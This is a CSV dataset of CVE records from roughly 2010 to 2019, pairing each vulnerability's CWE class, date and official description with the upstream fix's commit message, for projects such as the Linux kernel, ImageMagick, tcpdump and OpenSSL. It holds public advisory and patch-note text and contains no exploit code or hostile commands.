CVE-2016-9535,CWE-119,2016-11-22,"tif_predict.h and tif_predict.c in libtiff 4.0.6 have assertions that can lead to assertion failures in debug mode, or buffer overflows in release mode, when dealing with unusual tile size like YCbCr with subsampling. Reported as MSVR 35105, aka ""Predictor heap-buffer-overflow.""",previous commit (fix for MSVR 35105)
CVE-2017-18202,CWE-416,2018-02-27,"The __oom_reap_task_mm function in mm/oom_kill.c in the Linux kernel before 4.14.4 mishandles gather operations, which allows attackers to cause a denial of service (TLB entry leak or use-after-free) or possibly have unspecified other impact by triggering a copy_to_user call within a certain time window.","tlb_gather_mmu(&tlb, mm, 0, -1) means gathering the whole virtual memory space.  In this case, tlb->fullmm is true.  Some archs like arm64 doesn't flush TLB when tlb->fullmm is true:    commit 5a7862e (""arm64: tlbflush: avoid flushing when fullmm == 1"").  Which causes leaking of tlb entries.  Will clarifies his patch:  ""Basically, we tag each address space with an ASID (PCID on x86) which   is resident in the TLB. This means we can elide TLB invalidation when   pulling down a full mm because we won't ever assign that ASID to   another mm without doing TLB invalidation elsewhere (which actually   just nukes the whole TLB).    I think that means that we could potentially not fault on a kernel   uaccess, because we could hit in the TLB""  There could be a window between complete_signal() sending IPI to other cores and all threads sharing this mm are really kicked off from cores. In this window, the oom reaper may calls tlb_flush_mmu_tlbonly() to flush TLB then frees pages.  However, due to the above problem, the TLB entries are not really flushed on arm64.  Other threads are possible to access these pages through TLB entries.  Moreover, a copy_to_user() can also write to these pages without generating page fault, causes use-after-free bugs.  This patch gathers each vma instead of gathering full vm space.  In this case tlb->fullmm is not true.  The behavior of oom reaper become similar to munmapping before do_exit, which should be safe for all archs.  Link: http://lkml.kernel.org/r/20171107095453.179940-1-wangnan0@huawei.com Fixes: aac4536 (""mm, oom: introduce oom reaper"") Signed-off-by: Wang Nan <wangnan0@huawei.com> Acked-by: Michal Hocko <mhocko@suse.com> Acked-by: David Rientjes <rientjes@google.com> Cc: Minchan Kim <minchan@kernel.org> Cc: Will Deacon <will.deacon@arm.com> Cc: Bob Liu <liubo95@huawei.com> Cc: Ingo Molnar <mingo@kernel.org> Cc: Roman Gushchin <guro@fb.com> Cc: Konstantin Khlebnikov <khlebnikov@yandex-team.ru> Cc: Andrea Arcangeli <aarcange@redhat.com> Cc: <stable@vger.kernel.org> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2017-12988,CWE-125,2017-09-14,The telnet parser in tcpdump before 4.9.2 has a buffer over-read in print-telnet.c:telnet_parse().,This fixes a buffer over-read discovered by Forcepoint's security researchers Otto Airamo & Antti Levomäki.  Add a test using the capture file supplied by the reporter(s).
CVE-2018-17961,CWE-209,2018-10-15,Artifex Ghostscript 9.25 and earlier allows attackers to bypass a sandbox protection mechanism via vectors involving errorhandler setup. NOTE: this issue exists because of an incomplete fix for CVE-2018-17183.,
CVE-2016-5688,CWE-119,2016-12-13,"The WPG parser in ImageMagick before 6.9.4-4 and 7.x before 7.0.1-5, when a memory limit is set, allows remote attackers to have unspecified impact via vectors related to the SetImageExtent return-value check, which trigger (1) a heap-based buffer overflow in the SetPixelIndex function or an invalid write operation in the (2) ScaleCharToQuantum or (3) SetPixelIndex functions.",
CVE-2016-3183,CWE-125,2017-02-03,The sycc422_t_rgb function in common/color.c in OpenJPEG before 2.1.1 allows remote attackers to cause a denial of service (out-of-bounds read) via a crafted jpeg2000 file.,42x Images with an odd x0/y0 lead to subsampled component starting at the 2nd column/line. That is offset = comp->dx * comp->x0 - image->x0 = 1  Fix #726
CVE-2018-20467,CWE-835,2018-12-26,"In coders/bmp.c in ImageMagick before 7.0.8-16, an input file can result in an infinite loop and hang, with high CPU and memory consumption. Remote attackers could leverage this vulnerability to cause a denial of service via a crafted file.",
CVE-2012-1176,CWE-119,2012-08-26,Buffer overflow in the fribidi_utf8_to_unicode function in PyFriBidi before 0.11.0 allows remote attackers to cause a denial of service (application crash) via a 4-byte utf-8 sequence.,pyfribidi.c is now compiled as _pyfribidi. This module only handles unicode internally and doesn't use the fribidi_utf8_to_unicode function (which can't handle 4 byte utf-8 sequences). This fixes the buffer overflow in issue #2.  The code is now also much simpler: pyfribidi.c is down from 280 to 130 lines of code.  We now ship a pure python pyfribidi that handles the case when non-unicode strings are passed in.  We now also adapt the size of the output string if clean=True is passed.
CVE-2018-20763,CWE-787,2019-02-06,"In GPAC 0.7.1 and earlier, gf_text_get_utf8_line in media_tools/text_import.c in libgpac_static.a allows an out-of-bounds write because of missing szLineConv bounds checking.",
CVE-2013-7010,CWE-189,2013-12-09,Multiple integer signedness errors in libavcodec/dsputil.c in FFmpeg before 2.1 allow remote attackers to cause a denial of service (out-of-bounds array access) or possibly have unspecified other impact via crafted data.,Signed-off-by: Michael Niedermayer <michaelni@gmx.at>
CVE-2015-4471,CWE-189,2015-06-11,Off-by-one error in the lzxd_decompress function in lzxd.c in libmspack before 0.5 allows remote attackers to cause a denial of service (buffer under-read and application crash) via a crafted CAB archive.,
CVE-2017-12982,CWE-119,2017-08-21,"The bmp_read_info_header function in bin/jp2/convertbmp.c in OpenJPEG 2.2.0 does not reject headers with a zero biBitCount, which allows remote attackers to cause a denial of service (memory allocation failure) in the opj_image_create function in lib/openjp2/image.c, related to the opj_aligned_alloc_n function in opj_malloc.c.",
CVE-2012-3552,CWE-362,2012-10-03,Race condition in the IP implementation in the Linux kernel before 3.0 might allow remote attackers to cause a denial of service (slab corruption and system crash) by sending packets to an application that sets socket options during the handling of network traffic.,"We lack proper synchronization to manipulate inet->opt ip_options  Problem is ip_make_skb() calls ip_setup_cork() and ip_setup_cork() possibly makes a copy of ipc->opt (struct ip_options), without any protection against another thread manipulating inet->opt.  Another thread can change inet->opt pointer and free old one under us.  Use RCU to protect inet->opt (changed to inet->inet_opt).  Instead of handling atomic refcounts, just copy ip_options when necessary, to avoid cache line dirtying.  We cant insert an rcu_head in struct ip_options since its included in skb->cb[], so this patch is large because I had to introduce a new ip_options_rcu structure.  Signed-off-by: Eric Dumazet <eric.dumazet@gmail.com> Cc: Herbert Xu <herbert@gondor.apana.org.au> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2013-6450,CWE-310,2014-01-01,"The DTLS retransmission implementation in OpenSSL 1.0.0 before 1.0.0l and 1.0.1 before 1.0.1f does not properly maintain data structures for digest and encryption contexts, which might allow man-in-the-middle attackers to trigger the use of a different context and cause a denial of service (application crash) by interfering with packet delivery, related to ssl/d1_both.c and ssl/t1_enc.c.",
CVE-2019-8906,CWE-125,2019-02-18,do_core_note in readelf.c in libmagic.a in file 5.35 has an out-of-bounds read because memcpy is misused.,
CVE-2014-4343,CWE-415,2014-08-14,"Double free vulnerability in the init_ctx_reselect function in the SPNEGO initiator in lib/gssapi/spnego/spnego_mech.c in MIT Kerberos 5 (aka krb5) 1.10.x through 1.12.x before 1.12.2 allows remote attackers to cause a denial of service (memory corruption) or possibly execute arbitrary code via network traffic that appears to come from an intended acceptor, but specifies a security mechanism different from the one proposed by the initiator.","In commit cd7d6b0 (""Verify acceptor's mech in SPNEGO initiator"") the pointer sc->internal_mech became an alias into sc->mech_set->elements, which should be considered constant for the duration of the SPNEGO context.  So don't free it.  CVE-2014-4343:  In MIT krb5 releases 1.10 and newer, an unauthenticated remote attacker with the ability to spoof packets appearing to be from a GSSAPI acceptor can cause a double-free condition in GSSAPI initiators (clients) which are using the SPNEGO mechanism, by returning a different underlying mechanism than was proposed by the initiator.  At this stage of the negotiation, the acceptor is unauthenticated, and the acceptor's response could be spoofed by an attacker with the ability to inject traffic to the initiator.  Historically, some double-free vulnerabilities can be translated into remote code execution, though the necessary exploits must be tailored to the individual application and are usually quite complicated. Double-frees can also be exploited to cause an application crash, for a denial of service.  However, most GSSAPI client applications are not vulnerable, as the SPNEGO mechanism is not used by default (when GSS_C_NO_OID is passed as the mech_type argument to gss_init_sec_context()).  The most common use of SPNEGO is for HTTP-Negotiate, used in web browsers and other web clients.  Most such clients are believed to not offer HTTP-Negotiate by default, instead requiring a whitelist of sites for which it may be used to be configured.  If the whitelist is configured to only allow HTTP-Negotiate over TLS connections (""https://""), a successful attacker must also spoof the web server's SSL certificate, due to the way the WWW-Authenticate header is sent in a 401 (Unauthorized) response message.  Unfortunately, many instructions for enabling HTTP-Negotiate in common web browsers do not include a TLS requirement.      CVSSv2 Vector: AV:N/AC:H/Au:N/C:C/I:C/A:C/E:POC/RL:OF/RC:C  [kaduk@mit.edu: CVE summary and CVSSv2 vector]  ticket: 7969 (new) target_version: 1.12.2 tags: pullup"
CVE-2019-16995,CWE-401,2019-09-30,"In the Linux kernel before 5.0.3, a memory leak exits in hsr_dev_finalize() in net/hsr/hsr_device.c if hsr_add_port fails to add a port, which may cause denial of service, aka CID-6caabe7f197d.",
CVE-2017-8070,CWE-119,2017-04-23,"drivers/net/usb/catc.c in the Linux kernel 4.9.x before 4.9.11 interacts incorrectly with the CONFIG_VMAP_STACK option, which allows local users to cause a denial of service (system crash or memory corruption) or possibly have unspecified other impact by leveraging use of more than one virtual page for a DMA scatterlist.",
CVE-2015-8956,CWE-476,2016-10-10,The rfcomm_sock_bind function in net/bluetooth/rfcomm/sock.c in the Linux kernel before 4.2 allows local users to obtain sensitive information or cause a denial of service (NULL pointer dereference) via vectors involving a bind system call on a Bluetooth RFCOMM socket.,addr can be NULL and it should not be dereferenced before NULL checking.  Signed-off-by: Jaganath Kanakkassery <jaganath.k@samsung.com> Signed-off-by: Marcel Holtmann <marcel@holtmann.org>
CVE-2011-1833,CWE-264,2012-10-03,Race condition in the ecryptfs_mount function in fs/ecryptfs/main.c in the eCryptfs subsystem in the Linux kernel before 3.1 allows local users to bypass intended file permissions via a mount.ecryptfs_private mount with a mismatched uid.,Close a TOCTOU race for mounts done via ecryptfs-mount-private.  The mount source (device) can be raced when the ownership test is done in userspace. Provide Ecryptfs a means to force the uid check at mount time.  Signed-off-by: John Johansen <john.johansen@canonical.com> Cc: <stable@kernel.org> Signed-off-by: Tyler Hicks <tyhicks@linux.vnet.ibm.com>
CVE-2019-16714,CWE-909,2019-09-23,"In the Linux kernel before 5.2.14, rds6_inc_info_copy in net/rds/recv.c allows attackers to obtain sensitive information from kernel stack memory because tos and flags fields are not initialized.","The rds6_inc_info_copy() function has a couple struct members which are leaking stack information.  The ->tos field should hold actual information and the ->flags field needs to be zeroed out.  Fixes: 3eb4503 (""rds: add type of service(tos) infrastructure"") Fixes: b7ff8b1 (""rds: Extend RDS API for IPv6 support"") Reported-by: 黄ID蝴蝶 <butterflyhuangxx@gmail.com> Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com> Signed-off-by: Ka-Cheong Poon <ka-cheong.poon@oracle.com> Acked-by: Santosh Shilimkar <santosh.shilimkar@oracle.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2014-4608,CWE-190,2014-07-03,"Multiple integer overflows in the lzo1x_decompress_safe function in lib/lzo/lzo1x_decompress_safe.c in the LZO decompressor in the Linux kernel before 3.15.2 allow context-dependent attackers to cause a denial of service (memory corruption) via a crafted Literal Run.  NOTE: the author of the LZO algorithms says ""the Linux kernel is *not* affected; media hype.","The lzo decompressor can, if given some really crazy data, possibly overrun some variable types.  Modify the checking logic to properly detect overruns before they happen.  Reported-by: ""Don A. Bailey"" <donb@securitymouse.com> Tested-by: ""Don A. Bailey"" <donb@securitymouse.com> Cc: stable <stable@vger.kernel.org> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>"
CVE-2016-7976,CWE-20,2017-08-07,The PS Interpreter in Ghostscript 9.18 and 9.20 allows remote attackers to execute arbitrary code via crafted userparams.,
CVE-2014-3646,,2014-11-10,"arch/x86/kvm/vmx.c in the KVM subsystem in the Linux kernel through 3.17.2 does not have an exit handler for the INVVPID instruction, which allows guest OS users to cause a denial of service (guest OS crash) via a crafted application.","On systems with invvpid instruction support (corresponding bit in IA32_VMX_EPT_VPID_CAP MSR is set) guest invocation of invvpid causes vm exit, which is currently not handled and results in propagation of unknown exit to userspace.  Fix this by installing an invvpid vm exit handler.  This is CVE-2014-3646.  Cc: stable@vger.kernel.org Signed-off-by: Petr Matousek <pmatouse@redhat.com> Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>"
CVE-2019-15918,CWE-125,2019-09-04,An issue was discovered in the Linux kernel before 5.0.10. SMB2_negotiate in fs/cifs/smb2pdu.c has an out-of-bounds read because data structures are incompletely updated after a change from smb30 to smb21.,"There is a KASAN slab-out-of-bounds: BUG: KASAN: slab-out-of-bounds in _copy_from_iter_full+0x783/0xaa0 Read of size 80 at addr ffff88810c35e180 by task mount.cifs/539  CPU: 1 PID: 539 Comm: mount.cifs Not tainted 4.19 #10 Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS             rel-1.12.0-0-ga698c8995f-prebuilt.qemu.org 04/01/2014 Call Trace:  dump_stack+0xdd/0x12a  print_address_description+0xa7/0x540  kasan_report+0x1ff/0x550  check_memory_region+0x2f1/0x310  memcpy+0x2f/0x80  _copy_from_iter_full+0x783/0xaa0  tcp_sendmsg_locked+0x1840/0x4140  tcp_sendmsg+0x37/0x60  inet_sendmsg+0x18c/0x490  sock_sendmsg+0xae/0x130  smb_send_kvec+0x29c/0x520  __smb_send_rqst+0x3ef/0xc60  smb_send_rqst+0x25a/0x2e0  compound_send_recv+0x9e8/0x2af0  cifs_send_recv+0x24/0x30  SMB2_open+0x35e/0x1620  open_shroot+0x27b/0x490  smb2_open_op_close+0x4e1/0x590  smb2_query_path_info+0x2ac/0x650  cifs_get_inode_info+0x1058/0x28f0  cifs_root_iget+0x3bb/0xf80  cifs_smb3_do_mount+0xe00/0x14c0  cifs_do_mount+0x15/0x20  mount_fs+0x5e/0x290  vfs_kern_mount+0x88/0x460  do_mount+0x398/0x31e0  ksys_mount+0xc6/0x150  __x64_sys_mount+0xea/0x190  do_syscall_64+0x122/0x590  entry_SYSCALL_64_after_hwframe+0x44/0xa9  It can be reproduced by the following step:   1. samba configured with: server max protocol = SMB2_10   2. mount -o vers=default  When parse the mount version parameter, the 'ops' and 'vals' was setted to smb30,  if negotiate result is smb21, just update the 'ops' to smb21, but the 'vals' is still smb30. When add lease context, the iov_base is allocated with smb21 ops, but the iov_len is initiallited with the smb30. Because the iov_len is longer than iov_base, when send the message, copy array out of bounds.  we need to keep the 'ops' and 'vals' consistent.  Fixes: 9764c02 (""SMB3: Add support for multidialect negotiate (SMB2.1 and later)"") Fixes: d5c7076 (""smb3: add smb3.1.1 to default dialect list"")  Signed-off-by: ZhangXiaoxu <zhangxiaoxu5@huawei.com> Signed-off-by: Steve French <stfrench@microsoft.com> CC: Stable <stable@vger.kernel.org> Reviewed-by: Pavel Shilovsky <pshilov@microsoft.com>"
CVE-2014-7822,CWE-264,2015-03-16,"The implementation of certain splice_write file operations in the Linux kernel before 3.16 does not enforce a restriction on the maximum size of a single file, which allows local users to cause a denial of service (system crash) or possibly have unspecified other impact via a crafted splice system call, as demonstrated by use of a file descriptor associated with an ext4 filesystem.","iter_file_splice_write() - a ->splice_write() instance that gathers the pipe buffers, builds a bio_vec-based iov_iter covering those and feeds it to ->write_iter().  A bunch of simple cases coverted to that...  [AV: fixed the braino spotted by Cyrill]  Signed-off-by: Al Viro <viro@zeniv.linux.org.uk>"
CVE-2017-12640,CWE-125,2017-08-07,ImageMagick 7.0.6-1 has an out-of-bounds read vulnerability in ReadOneMNGImage in coders/png.c.,
CVE-2017-12899,CWE-125,2017-09-14,The DECnet parser in tcpdump before 4.9.2 has a buffer over-read in print-decnet.c:decnet_print().,"If we're skipping over padding before the *real* flags, check whether the real flags are in the captured data before fetching it.  This fixes a buffer over-read discovered by Kamil Frankowicz.  Note one place where we don't need to do bounds checking as it's already been done.  Add a test using the capture file supplied by the reporter(s)."
CVE-2016-10162,CWE-476,2017-01-24,"The php_wddx_pop_element function in ext/wddx/wddx.c in PHP 7.0.x before 7.0.15 and 7.1.x before 7.1.1 allows remote attackers to cause a denial of service (NULL pointer dereference and application crash) via an inapplicable class name in a wddxPacket XML document, leading to mishandling in a wddx_deserialize call.",
CVE-2013-1797,CWE-399,2013-03-22,Use-after-free vulnerability in arch/x86/kvm/x86.c in the Linux kernel through 3.8.4 allows guest OS users to cause a denial of service (host OS memory corruption) or possibly have unspecified other impact via a crafted application that triggers use of a guest physical address (GPA) in (1) movable or (2) removable memory during an MSR_KVM_SYSTEM_TIME kvm_set_msr_common operation.,"There is a potential use after free issue with the handling of MSR_KVM_SYSTEM_TIME.  If the guest specifies a GPA in a movable or removable memory such as frame buffers then KVM might continue to write to that address even after it's removed via KVM_SET_USER_MEMORY_REGION.  KVM pins the page in memory so it's unlikely to cause an issue, but if the user space component re-purposes the memory previously used for the guest, then the guest will be able to corrupt that memory.  Tested: Tested against kvmclock unit test  Signed-off-by: Andrew Honig <ahonig@google.com> Signed-off-by: Marcelo Tosatti <mtosatti@redhat.com>"
CVE-2018-16542,CWE-787,2018-09-05,"In Artifex Ghostscript before 9.24, attackers able to supply crafted PostScript files could use insufficient interpreter stack-size checking during error handling to crash the interpreter.",
CVE-2015-7613,CWE-362,2015-10-19,"Race condition in the IPC object implementation in the Linux kernel through 4.2.3 allows local users to gain privileges by triggering an ipc_addid call that leads to uid and gid comparisons against uninitialized data, related to msg.c, shm.c, and util.c.","As reported by Dmitry Vyukov, we really shouldn't do ipc_addid() before having initialized the IPC object state.  Yes, we initialize the IPC object in a locked state, but with all the lockless RCU lookup work, that IPC object lock no longer means that the state cannot be seen.  We already did this for the IPC semaphore code (see commit e8577d1: ""ipc/sem.c: fully initialize sem_array before making it visible"") but we clearly forgot about msg and shm.  Reported-by: Dmitry Vyukov <dvyukov@google.com> Cc: Manfred Spraul <manfred@colorfullife.com> Cc: Davidlohr Bueso <dbueso@suse.de> Cc: stable@vger.kernel.org Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2017-16529,CWE-125,2017-11-04,The snd_usb_create_streams function in sound/usb/card.c in the Linux kernel before 4.13.6 allows local users to cause a denial of service (out-of-bounds read and system crash) or possibly have unspecified other impact via a crafted USB device.,"When a USB-audio device receives a maliciously adjusted or corrupted buffer descriptor, the USB-audio driver may access an out-of-bounce value at its parser.  This was detected by syzkaller, something like:    BUG: KASAN: slab-out-of-bounds in usb_audio_probe+0x27b2/0x2ab0   Read of size 1 at addr ffff88006b83a9e8 by task kworker/0:1/24   CPU: 0 PID: 24 Comm: kworker/0:1 Not tainted 4.14.0-rc1-42251-gebb2c2437d80 #224   Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Bochs 01/01/2011   Workqueue: usb_hub_wq hub_event   Call Trace:    __dump_stack lib/dump_stack.c:16    dump_stack+0x292/0x395 lib/dump_stack.c:52    print_address_description+0x78/0x280 mm/kasan/report.c:252    kasan_report_error mm/kasan/report.c:351    kasan_report+0x22f/0x340 mm/kasan/report.c:409    __asan_report_load1_noabort+0x19/0x20 mm/kasan/report.c:427    snd_usb_create_streams sound/usb/card.c:248    usb_audio_probe+0x27b2/0x2ab0 sound/usb/card.c:605    usb_probe_interface+0x35d/0x8e0 drivers/usb/core/driver.c:361    really_probe drivers/base/dd.c:413    driver_probe_device+0x610/0xa00 drivers/base/dd.c:557    __device_attach_driver+0x230/0x290 drivers/base/dd.c:653    bus_for_each_drv+0x161/0x210 drivers/base/bus.c:463    __device_attach+0x26e/0x3d0 drivers/base/dd.c:710    device_initial_probe+0x1f/0x30 drivers/base/dd.c:757    bus_probe_device+0x1eb/0x290 drivers/base/bus.c:523    device_add+0xd0b/0x1660 drivers/base/core.c:1835    usb_set_configuration+0x104e/0x1870 drivers/usb/core/message.c:1932    generic_probe+0x73/0xe0 drivers/usb/core/generic.c:174    usb_probe_device+0xaf/0xe0 drivers/usb/core/driver.c:266    really_probe drivers/base/dd.c:413    driver_probe_device+0x610/0xa00 drivers/base/dd.c:557    __device_attach_driver+0x230/0x290 drivers/base/dd.c:653    bus_for_each_drv+0x161/0x210 drivers/base/bus.c:463    __device_attach+0x26e/0x3d0 drivers/base/dd.c:710    device_initial_probe+0x1f/0x30 drivers/base/dd.c:757    bus_probe_device+0x1eb/0x290 drivers/base/bus.c:523    device_add+0xd0b/0x1660 drivers/base/core.c:1835    usb_new_device+0x7b8/0x1020 drivers/usb/core/hub.c:2457    hub_port_connect drivers/usb/core/hub.c:4903    hub_port_connect_change drivers/usb/core/hub.c:5009    port_event drivers/usb/core/hub.c:5115    hub_event+0x194d/0x3740 drivers/usb/core/hub.c:5195    process_one_work+0xc7f/0x1db0 kernel/workqueue.c:2119    worker_thread+0x221/0x1850 kernel/workqueue.c:2253    kthread+0x3a1/0x470 kernel/kthread.c:231    ret_from_fork+0x2a/0x40 arch/x86/entry/entry_64.S:431  This patch adds the checks of out-of-bounce accesses at appropriate places and bails out when it goes out of the given buffer.  Reported-by: Andrey Konovalov <andreyknvl@google.com> Tested-by: Andrey Konovalov <andreyknvl@google.com> Cc: <stable@vger.kernel.org> Signed-off-by: Takashi Iwai <tiwai@suse.de>"
CVE-2016-7915,CWE-125,2016-11-16,"The hid_input_field function in drivers/hid/hid-core.c in the Linux kernel before 4.6 allows physically proximate attackers to obtain sensitive information from kernel memory or cause a denial of service (out-of-bounds read) by connecting a device, as demonstrated by a Logitech DJ receiver.","Plugging a Logitech DJ receiver with KASAN activated raises a bunch of out-of-bound readings.  The fields are allocated up to MAX_USAGE, meaning that potentially, we do not have enough fields to fit the incoming values. Add checks and silence KASAN.  Signed-off-by: Benjamin Tissoires <benjamin.tissoires@redhat.com> Signed-off-by: Jiri Kosina <jkosina@suse.cz>"
CVE-2014-5139,,2014-08-13,The ssl_set_client_disabled function in t1_lib.c in OpenSSL 1.0.1 before 1.0.1i allows remote SSL servers to cause a denial of service (NULL pointer dereference and client application crash) via a ServerHello message that includes an SRP ciphersuite without the required negotiation of that ciphersuite with the client.,
CVE-2010-4706,,2011-01-24,"The pam_sm_close_session function in pam_xauth.c in the pam_xauth module in Linux-PAM (aka pam) 1.1.2 and earlier does not properly handle a failure to determine a certain target uid, which might allow local users to delete unintended files by executing a program that relies on the pam_xauth PAM check.",
CVE-2018-20182,CWE-119,2019-03-15,rdesktop versions up to and including v1.8.3 contain a Buffer Overflow over the global variables in the function seamless_process_line() that results in memory corruption and probably even a remote code execution.,This commit includes fixes for a set of 21 vulnerabilities in rdesktop when a malicious RDP server is used.  All vulnerabilities was identified and reported by Eyal Itkin.   * Add rdp_protocol_error function that is used in several fixes  * Refactor of process_bitmap_updates  * Fix possible integer overflow in s_check_rem() on 32bit arch  * Fix memory corruption in process_bitmap_data - CVE-2018-8794  * Fix remote code execution in process_bitmap_data - CVE-2018-8795  * Fix remote code execution in process_plane - CVE-2018-8797  * Fix Denial of Service in mcs_recv_connect_response - CVE-2018-20175  * Fix Denial of Service in mcs_parse_domain_params - CVE-2018-20175  * Fix Denial of Service in sec_parse_crypt_info - CVE-2018-20176  * Fix Denial of Service in sec_recv - CVE-2018-20176  * Fix minor information leak in rdpdr_process - CVE-2018-8791  * Fix Denial of Service in cssp_read_tsrequest - CVE-2018-8792  * Fix remote code execution in cssp_read_tsrequest - CVE-2018-8793  * Fix Denial of Service in process_bitmap_data - CVE-2018-8796  * Fix minor information leak in rdpsnd_process_ping - CVE-2018-8798  * Fix Denial of Service in process_secondary_order - CVE-2018-8799  * Fix remote code execution in in ui_clip_handle_data - CVE-2018-8800  * Fix major information leak in ui_clip_handle_data - CVE-2018-20174  * Fix memory corruption in rdp_in_unistr - CVE-2018-20177  * Fix Denial of Service in process_demand_active - CVE-2018-20178  * Fix remote code execution in lspci_process - CVE-2018-20179  * Fix remote code execution in rdpsnddbg_process - CVE-2018-20180  * Fix remote code execution in seamless_process - CVE-2018-20181  * Fix remote code execution in seamless_process_line - CVE-2018-20182
CVE-2016-7425,CWE-119,2016-10-16,"The arcmsr_iop_message_xfer function in drivers/scsi/arcmsr/arcmsr_hba.c in the Linux kernel through 4.8.2 does not restrict a certain length field, which allows local users to gain privileges or cause a denial of service (heap-based buffer overflow) via an ARCMSR_MESSAGE_WRITE_WQBUFFER control code.","We need to put an upper bound on ""user_len"" so the memcpy() doesn't overflow.  Cc: <stable@vger.kernel.org> Reported-by: Marco Grassi <marco.gra@gmail.com> Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com> Reviewed-by: Tomas Henzl <thenzl@redhat.com> Signed-off-by: Martin K. Petersen <martin.petersen@oracle.com>"
CVE-2019-11338,CWE-476,2019-04-19,"libavcodec/hevcdec.c in FFmpeg 3.4 and 4.1.2 mishandles detection of duplicate first slices, which allows remote attackers to cause a denial of service (NULL pointer dereference and out-of-array access) or possibly have unspecified other impact via crafted HEVC data.",Fixes: NULL pointer dereference and out of array access Fixes: 13871/clusterfuzz-testcase-minimized-ffmpeg_AV_CODEC_ID_HEVC_fuzzer-5746167087890432 Fixes: 13845/clusterfuzz-testcase-minimized-ffmpeg_AV_CODEC_ID_HEVC_fuzzer-5650370728034304  This also fixes the return code for explode mode  Found-by: continuous fuzzing process https://github.com/google/oss-fuzz/tree/master/projects/ffmpeg Reviewed-by: James Almer <jamrial@gmail.com> Signed-off-by: Michael Niedermayer <michael@niedermayer.cc> (cherry picked from commit 5465562) Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>
CVE-2017-13012,CWE-125,2017-09-14,The ICMP parser in tcpdump before 4.9.2 has a buffer over-read in print-icmp.c:icmp_print().,"Check before fetching the length from the included packet's IPv4 header.  This fixes a buffer over-read discovered by Bhargava Shastry, SecT/TU Berlin.  Add a test using the capture file supplied by the reporter(s), modified so the capture file won't be rejected as an invalid capture."
CVE-2015-8962,CWE-415,2016-11-16,Double free vulnerability in the sg_common_write function in drivers/scsi/sg.c in the Linux kernel before 4.4 allows local users to gain privileges or cause a denial of service (memory corruption and system crash) by detaching a device during an SG_IO ioctl call.,"In sg_common_write(), we free the block request and return -ENODEV if the device is detached in the middle of the SG_IO ioctl().  Unfortunately, sg_finish_rem_req() also tries to free srp->rq, so we end up freeing rq->cmd in the already free rq object, and then free the object itself out from under the current user.  This ends up corrupting random memory via the list_head on the rq object. The most common crash trace I saw is this:    ------------[ cut here ]------------   kernel BUG at block/blk-core.c:1420!   Call Trace:   [<ffffffff81281eab>] blk_put_request+0x5b/0x80   [<ffffffffa0069e5b>] sg_finish_rem_req+0x6b/0x120 [sg]   [<ffffffffa006bcb9>] sg_common_write.isra.14+0x459/0x5a0 [sg]   [<ffffffff8125b328>] ? selinux_file_alloc_security+0x48/0x70   [<ffffffffa006bf95>] sg_new_write.isra.17+0x195/0x2d0 [sg]   [<ffffffffa006cef4>] sg_ioctl+0x644/0xdb0 [sg]   [<ffffffff81170f80>] do_vfs_ioctl+0x90/0x520   [<ffffffff81258967>] ? file_has_perm+0x97/0xb0   [<ffffffff811714a1>] SyS_ioctl+0x91/0xb0   [<ffffffff81602afb>] tracesys+0xdd/0xe2     RIP [<ffffffff81281e04>] __blk_put_request+0x154/0x1a0  The solution is straightforward: just set srp->rq to NULL in the failure branch so that sg_finish_rem_req() doesn't attempt to re-free it.  Additionally, since sg_rq_end_io() will never be called on the object when this happens, we need to free memory backing ->cmd if it isn't embedded in the object itself.  KASAN was extremely helpful in finding the root cause of this bug.  Signed-off-by: Calvin Owens <calvinowens@fb.com> Acked-by: Douglas Gilbert <dgilbert@interlog.com> Signed-off-by: Martin K. Petersen <martin.petersen@oracle.com>"
CVE-2011-2211,CWE-264,2012-06-13,"The osf_wait4 function in arch/alpha/kernel/osf_sys.c in the Linux kernel before 2.6.39.4 on the Alpha platform uses an incorrect pointer, which allows local users to gain privileges by writing a certain integer value to kernel memory.","Fix several security issues in Alpha-specific syscalls.  Untested, but mostly trivial.  1. Signedness issue in osf_getdomainname allows copying out-of-bounds kernel memory to userland.  2. Signedness issue in osf_sysinfo allows copying large amounts of kernel memory to userland.  3. Typo (?) in osf_getsysinfo bounds minimum instead of maximum copy size, allowing copying large amounts of kernel memory to userland.  4. Usage of user pointer in osf_wait4 while under KERNEL_DS allows privilege escalation via writing return value of sys_wait4 to kernel memory.  Signed-off-by: Dan Rosenberg <drosenberg@vsecurity.com> Cc: Richard Henderson <rth@twiddle.net> Cc: Ivan Kokshaysky <ink@jurassic.park.msu.ru> Cc: Matt Turner <mattst88@gmail.com> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2019-13233,CWE-362,2019-07-04,"In arch/x86/lib/insn-eval.c in the Linux kernel before 5.1.9, there is a use-after-free for access to an LDT entry because of a race condition between modify_ldt() and a #BR exception for an MPX bounds violation.","get_desc() computes a pointer into the LDT while holding a lock that protects the LDT from being freed, but then drops the lock and returns the (now potentially dangling) pointer to its caller.  Fix it by giving the caller a copy of the LDT entry instead.  Fixes: 670f928 (""x86/insn-eval: Add utility function to get segment descriptor"") Cc: stable@vger.kernel.org Signed-off-by: Jann Horn <jannh@google.com> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2017-13022,CWE-125,2017-09-14,The IP parser in tcpdump before 4.9.2 has a buffer over-read in print-ip.c:ip_printroute().,"This fixes a buffer over-read discovered by Bhargava Shastry, SecT/TU Berlin.  Add a test using the capture file supplied by the reporter(s), modified so the capture file won't be rejected as an invalid capture."
CVE-2016-7539,CWE-399,2017-07-25,Memory leak in AcquireVirtualMemory in ImageMagick before 7 allows remote attackers to cause a denial of service (memory consumption) via unspecified vectors.,
